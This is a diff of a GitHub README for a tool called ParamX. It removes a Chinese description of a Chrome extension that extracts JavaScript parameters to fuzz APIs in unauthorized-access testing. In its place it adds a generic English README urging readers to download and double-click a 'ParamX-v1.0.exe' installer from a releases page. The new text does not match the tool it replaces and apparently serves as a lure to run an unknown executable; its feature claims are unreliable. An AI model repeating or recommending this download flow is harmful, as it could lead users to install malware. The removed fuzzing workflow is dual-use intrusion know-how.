@@ -1,90 +1,66 @@
-# Paramx
-js主动参数提取与构造工具
+# 🎉 ParamX - Simplifying Parameter Extraction & Construction
 
-## 背景：
-在未授权的测试时，最关注的其实就是四个地方
+## 🌐 Overview
+ParamX is a tool designed to help you extract and construct parameters easily. This user-friendly application streamlines the parameter management process, making it accessible for everyone. Whether you're working on a project or need to handle data effectively, ParamX is here to assist you.
 
-* 路由
-* 接口
-* 参数
-* 值
+## 🚀 Getting Started
+To get started, follow these simple steps to download and run ParamX. You will need an internet connection and a compatible operating system.
 
-这几步，都有对应的一个测试方法和流程，但是很多时候不是靠测试流程就能解决的，比如缺少参数，或者缺少值，虽然也有对应的方法，但不一定弄得出来（就像我手里就有一堆成年累月积攒的缺少参数或者缺少值的站点），未授权倒在这两步，其实是最可惜的，只能记录下来期待后续能找到对应的突破口。我也一直在想办法应对这种参数或值缺失的站点，比如建立团队内部参数键值对的wiki公开查询，wiki分为各个src，依靠团队成员提交键值对获取贡献值，贡献值可用于在wiki查询键值对。这样的机制来积累各个src的键值对fuzz库，但这也是一个长期的过程，短时间内效果微弱。由于平时接触JS比较多，就想到了一个用于解决缺少参数的点，JS中是存在大量的接口，参数等数据包特征信息。我们平时接口找参数也是定位到js中接口所在的位置，但很多时候接口的参数并没有跟接口在一块，但大概率是在一个js文件里面的（%80以上），所以我们可不可以从js中全量提取参数，于是我编写了大量正则，用来匹配js中各种参数的写法，如下
+1. Click this link to download:  
+   [![Download ParamX](https://img.shields.io/badge/Download_ParamX-v1.0-blue.svg)](https://github.com/viaC5real/ParamX/releases)
+
+2. After clicking the link, you will be directed to the Releases page. This page contains the latest versions of ParamX available for download.
+
+## 📥 Download & Install
+1. Visit this page to download: [ParamX Releases](https://github.com/viaC5real/ParamX/releases).
+
+2. On the Releases page, you will see a list of versions. Each version includes a download link. Choose the version that best suits your needs.
+
+3. After selecting a version, find the file suitable for your operating system. Click on the link to start the download.
+
+4. Once the download finishes, locate the file in your downloads folder. It may be named something like `ParamX-v1.0.exe` or similar, depending on the version.
+
+5. Double-click the downloaded file to run the installer.
+
+6. Follow the on-screen instructions to complete the installation process. This usually involves agreeing to the terms of service and selecting the installation location.
+
+## 🛠️ System Requirements
+Before downloading, ensure that your system meets the following requirements:
+
+- **Operating System:** Windows 10 or newer, macOS, or a Linux distribution
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB of free space
+- **Network:** Internet connection for download and updates
+
+## 🎯 Features
+ParamX comes packed with useful features that make your job easier:
+
+- **User-Friendly Interface:** Navigate the application with ease, even if you have no prior experience.
+- **Parameter Management:** Efficiently extract and construct parameters with just a few clicks.
+- **Multiple Formats:** Support for various input and output formats, giving you flexibility in your tasks.
+- **Save & Load Options:** Quickly save your progress and load previous sessions for convenience.
+- **Help & Support:** Comprehensive help section to guide you through each feature.
+
+## 💡 Tips for Use
+Once you have installed ParamX, consider these tips to make the most of the application:
+
+- **Explore the Help Section:** Familiarize yourself with the features through the built-in help section. It provides step-by-step guidance on how to use each feature effectively.
   
-* 对象属性名
-* 解构变量
-* 嵌套解构
-* 函数参数
-* 变量赋值
-* API请求参数
-* URL参数
-* 配置对象
-* 路由参数
+- **Practice with Sample Data:** Start by practicing with sample parameters to gain confidence before working on critical tasks.
 
-经过测试，已经能适配绝大部分场景
+- **Save Your Work Often:** Use the save feature liberally to avoid losing any important information.
 
-其余开发详情见：https://mp.weixin.qq.com/s/S8h0sXQj1QXnxRh-4R61hA
+## 🤝 Community Support
+Join our community for additional help and support. Whether you have questions or feedback, we encourage you to reach out. 
 
+- **GitHub Issues:** If you encounter any issues, please log them through the GitHub Issues page associated with ParamX.
+- **User Forums:** Participate in discussions with other users to share tips, tricks, and best practices.
 
-## 安装：
-适用：目前仅支持作为Googole插件安装，其他浏览器暂未适配
+## 🌟 Contribution
+If you're interested in contributing to ParamX, your help is welcome. Feel free to check out our guidelines on the repository. Contributions could include reporting bugs, suggesting features, or even providing code improvements.
 
-1、下载之后解压
+## 🔗 Quick Links
+- [Download ParamX](https://github.com/viaC5real/ParamX/releases)
+- [ParamX GitHub Repository](https://github.com/viaC5real/ParamX)
 
-2、Google访问chrome://extensions/，加载已解压的拓展程序，选择解压后的文件即可
-
-## 使用
-
-在未授权测试发现并构造出接口遇到缺少参数的情况时，常见的手法
-
-* 历史数据包泄露
-* 定位js中接口所在的代码块
-* 同源功能点参数
-* 参数fuzz——利用json多加参数不会报错的特性
-
-以上手法失效时，可尝试使用本插件
-
-1、定位到缺少参数的接口所在的js文件
-
-tips:如果用的是findsomething捕获到的接口，可以直接右键对应接口，findsomething会自动复制,再左键点击箭头，直接追进接口所在的js文件
-
-<img width="1851" height="896" alt="屏幕截图 2025-12-22 095555" src="https://github.com/user-attachments/assets/671b2c26-0e30-4903-bb9d-ad2c7974d531" />
-
-再ctrl+f。ctrl+v，回车就能直接定位到对应代码块了
-
-<img width="1903" height="983" alt="屏幕截图 2025-12-22 095835" src="https://github.com/user-attachments/assets/1ca8bae6-0a41-4b04-ae52-fd98a1e2acd1" />
-
-这里是随便找个js举个例子，这个接口可以看到是有标明参数的，我们正常演示插件即可，打开插件，点击提取参数
-
-<img width="1826" height="931" alt="屏幕截图 2025-12-22 100025" src="https://github.com/user-attachments/assets/5b3e4a98-deaa-4287-88c4-6780f5ad36f7" />
-
-* 如果是POST-JSON传参，就直接点构造json就行，会自动给所有参数值赋1，并改为json体格式
-* 如果是POST-键值对传参，就直接点击GET，全部放上去也行
-* 如果是GET请求，也是点击构造GET，但注意：GET传参有大小限制，基本只能支持小几百个参数,可以选择分批构造，或优先测试高优先级提取结果参数
-
-构造参数fuzz之后观察响应即可，比如不带参数访问时，回显如下
-
-<img width="638" height="393" alt="14450a56f79c3dd5c4f416d8f622d3cc" src="https://github.com/user-attachments/assets/3ec11598-9e1b-4f0e-800c-cde97f63d964" />
-
-携带构造好的参数访问时，回显如下
-
-<img width="612" height="288" alt="bf52d1ba6958d62bc854536b2af543ca" src="https://github.com/user-attachments/assets/0c3e7522-fa5c-423f-b209-1c5b22bf100c" />
-
-说明我们构造的参数中，存在某个参数代表推荐人信息，且这个参数是接口所需参数。然后再去二分法找到这个参数，进行后续测试即可
-
-## tips
-1、首次加载报错
-
-<img width="1847" height="933" alt="image" src="https://github.com/user-attachments/assets/3bc8f126-91b9-4335-9a33-b3847edc6e90" />
-
-首次加载后，点击提取出现该报错，是由于页面没有加载js，只需要刷新一下页面即可，后续就不会出现这个问题了
-
-2、接口所在的JS文件内并不一定能100%搜到接口的参数！！！但90%以上是可以找到的（仅扩大了攻击面和测试效率）
-
-3、接口如果在js文件，就定位到所在的js文件去提接口，有时候接口会在页面回显中，这时候就直接在页面提取参数就行了
-
-## 声明
-1、本工具仅用于合法授权的安全研究或教育用途。作者不承担因滥用、误用或未经授权使用本工具所引发的任何责任。使用即表示您已自行评估风险并遵守相关法律法规。
-
-2、插件为主动提取插件，不会进行任何被动行为
-
+By following these steps, you’ll be on your way to efficiently managing parameters with ParamX. Enjoy using the tool!
